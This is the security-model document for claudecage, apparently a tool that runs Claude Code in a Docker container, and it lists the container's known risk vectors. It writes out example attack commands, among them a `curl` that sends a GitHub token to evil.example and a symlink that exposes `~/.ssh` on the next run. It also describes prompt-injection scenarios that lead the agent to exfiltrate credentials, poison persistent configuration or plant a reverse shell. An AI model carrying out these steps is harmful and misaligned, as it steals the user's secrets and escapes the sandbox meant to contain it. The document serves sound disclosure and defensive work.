# Security model

claudecage runs Claude Code with `--dangerously-skip-permissions` inside a Docker container. The container limits what
the agent can see and do on the host, but **this is not a hardened security boundary**. Several realistic attack vectors
remain open — this document enumerates them so you can make an informed decision about what you expose.

## What the sandbox provides

- **Filesystem isolation.** Only the project directory, `~/.claude`, and a few optional paths are mounted. The rest of
  `$HOME` (including `~/.ssh`, `~/.aws`, browser profiles) is not visible by default.
- **No root, no capabilities.** The agent runs as a non-root user with `--cap-drop=ALL` and
  `--security-opt=no-new-privileges`.
- **Ephemeral containers.** Each session is a fresh container removed on exit. No state accumulates inside the container
  between runs.

## Known risk vectors

### 1. Credential exfiltration via `~/.claude`

`~/.claude` is mounted read-write because Claude Code needs it to function. When you authenticate inside the container
via `/login`, Claude Code writes an OAuth bearer token to `~/.claude/.credentials.json`. Because `~/.claude` is a bind
mount, this file lands on the host — and because the mount is read-write, every subsequent session can read it. Anyone
with this token can make API calls as you.

A prompt injection attack could instruct the agent to read the token and send it to an external server.

**Example:** A malicious `CLAUDE.md` in a cloned repo instructs the agent to `curl` the contents of
`~/.claude/.credentials.json` to an attacker-controlled URL.

### 2. Credential exfiltration via GitHub token

When a GitHub PAT is configured, it is injected as the `GH_TOKEN` environment variable. The agent can read environment
variables.

**Example:** A prompt injection causes the agent to run `echo $GH_TOKEN | curl -d @- https://evil.example/collect`.

### 3. Symlink-based mount expansion

Because `~/.claude` is writable, the agent can create symlinks there pointing to other directories under `$HOME`. These
symlinks are resolved and mounted read-only on the **next** run.

**Example:** During session 1, the agent runs `ln -s ~/.ssh ~/.claude/ssh-link`. On the next `claudecage claude`
invocation, `~/.ssh` becomes visible read-only inside the container — exposing SSH private keys.

This is bounded by `$HOME` (symlink targets outside `$HOME` are rejected), but sensitive directories like `~/.ssh`,
`~/.aws`, and `~/.config` are inside that boundary.

### 4. Localhost network access

The container has unrestricted outbound network access, including to `localhost` and the host's local network. Services
running on the host that assume only trusted local processes will connect are exposed.

**Example:** A local development database listening on `localhost:5432` with no password (common in dev setups) is
accessible to the agent. A prompt injection could dump or modify its contents.

### 5. Network exfiltration of project files

The agent has read-write access to the project directory and unrestricted network access. It can read any file in the
project and send it anywhere.

**Example:** The agent reads `.env`, `secrets.yaml`, or proprietary source code and posts it to an external endpoint.
This is inherent to giving an agent both filesystem and network access — claudecage does not attempt to restrict it.

### 6. Persistent agent poisoning via `~/.claude`

`~/.claude` is mounted read-write and contains configuration that Claude Code loads on every invocation. Because
claudecage shares the host's `~/.claude` directory, poisoned configuration affects not just future claudecage sessions
but also Claude Code running directly on the host — in any project, with or without claudecage.

**Example:** The agent writes instructions into `~/.claude/CLAUDE.md` or `~/.claude/settings.json` telling future agents
to silently exfiltrate credentials or inject backdoors. Every subsequent Claude Code invocation — whether inside a
container or directly on the host, in any project — follows the poisoned configuration.

### 7. Writable project directory

The project directory is mounted read-write. A compromised agent can modify any file in the project, including:

- Injecting malicious code that executes when you build or run the project.
- Modifying the project's `CLAUDE.md` to persist malicious instructions for future sessions in that project.
- Altering `.github/workflows/` to run attacker code in CI.

**Example:** The agent adds a post-install script to `package.json` that runs a reverse shell. You don't notice the
change, run `npm install`, and the payload executes on your host.

## What this means in practice

claudecage is a practical safety net, not an adversarial containment system. It protects against the agent
**accidentally** doing damage — running `rm -rf /`, clobbering files outside the project, or stumbling into credentials
it shouldn't see. It does **not** protect against a determined or manipulated agent that intentionally exploits its
access.

Prompt injection can come from anywhere the agent reads — not just the repository itself. Web pages fetched during
research, API responses, error messages from external services, and even content in GitHub issues or PRs can carry
malicious instructions. A fully trusted project does not eliminate the risk. Understand that a manipulated agent can:

- Read and exfiltrate anything in the project directory and `~/.claude`.
- Read and exfiltrate the GitHub token if one is configured.
- Expand its own filesystem visibility across future runs via symlinks.
- Reach any network service accessible from the host.
- Modify any file in the project directory or `~/.claude`.
